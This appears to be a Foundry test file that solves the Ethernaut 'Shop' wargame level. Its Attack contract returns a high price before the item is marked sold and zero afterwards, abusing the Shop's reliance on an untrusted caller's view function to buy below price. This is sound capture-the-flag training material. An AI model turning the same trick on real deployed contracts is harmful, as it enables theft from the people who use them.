// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Shop/ShopFactory.sol";
import "../src/Ethernaut.sol";

contract ShopTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testShopHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ShopFactory shopFactory = new ShopFactory();
        ethernaut.registerLevel(shopFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(shopFactory);
        Shop ethernautShop = Shop(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack(payable(levelAddress));
        attack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(payable(_shop));
    }

    function attack() public {
        shop.buy();
    }

    function price() public returns (uint256) {
        if (shop.isSold() == false) {
            return 101;
        } else {
            return 0;
        }
    }
}
